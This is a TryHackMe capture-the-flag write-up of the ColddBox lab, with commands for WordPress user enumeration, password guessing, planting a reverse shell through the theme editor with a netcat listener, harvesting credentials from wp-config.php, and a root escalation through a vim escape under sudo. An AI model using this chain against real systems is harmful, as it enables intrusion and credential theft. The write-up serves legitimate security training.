TryHackMe — ColddBox Write-Up

Platform: TryHackMe

⸻

1. Enumeration

Nmap Scan

Initial full port scan:

sudo nmap -p- -T4 10.81.191.186

Open ports discovered:
	•	80/tcp — Apache 2.4.18
	•	4512/tcp — OpenSSH 7.2p2

Service detection:

sudo nmap -A -p 80,4512 10.81.191.186

The web server revealed a WordPress installation.

⸻

2. Web Enumeration — WordPress

Browsing the website confirmed it was running WordPress.

Login page identified at:

/wp-login.php

Using WPScan:

wpscan --url http://10.81.191.186 --enumerate u

User discovered:

c0ldd

Password attack revealed valid credentials:

Username: c0ldd
Password: 9876543210

Successful login into WordPress admin panel.

⸻

3. Initial Access — Reverse Shell via Theme Editor

After logging in:
	1.	Navigated to
Appearance → Theme Editor
	2.	Opened:

404.php

	3.	Inserted a reverse shell from pentestmonkey (PHP reverse shell).
	4.	Started listener on Kali:

nc -lvnp 4445

	5.	Triggered the reverse shell by accessing a non-existent page:

http://10.81.191.186/?p=9999

Received initial shell as:

www-data

Stabilized shell:

python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo
fg


⸻

4. Privilege Escalation — User

Located WordPress configuration file:

cat /var/www/html/wp-config.php

Database credentials found:

DB_USER: c0ldd
DB_PASSWORD: cybersecurity

Switched user:

su c0ldd

Password:

cybersecurity

User shell obtained.

⸻

5. User Flag

Navigated to:

cd /home/c0ldd
cat user.txt

User flag retrieved successfully.

⸻

6. Privilege Escalation — Root

Checked sudo permissions:

sudo -l

Output showed:

(root) /usr/bin/vim


⸻

Root via Vim

Executed:

sudo vim

Inside vim:

:!bash

Now:

whoami

Output:

root


⸻

7. Root Flag

Retrieved:

cat /root/root.txt

Root flag captured.

⸻

Attack Chain Summary
	1.	Nmap → Identify WordPress
	2.	WPScan → Enumerate user
	3.	Password attack → WordPress admin access
	4.	Theme Editor (404.php) → Insert PentestMonkey reverse shell
	5.	Netcat listener → Initial www-data shell
	6.	Extract DB credentials from wp-config.php
	7.	su to c0ldd (password reuse)
	8.	sudo -l → Vim allowed
	9.	Vim shell escape → Root
	10.	Capture flags

⸻

Vulnerabilities Exploited
	•	Weak WordPress credentials
	•	Reverse shell via theme editor
	•	Credential reuse
	•	Sudo misconfiguration (vim)

⸻

Key Lessons
	•	WordPress admin access = potential RCE
	•	Always check wp-config.php for reused credentials
	•	sudo -l is critical after user access
	•	GTFOBins knowledge enables fast privilege escalation

⸻
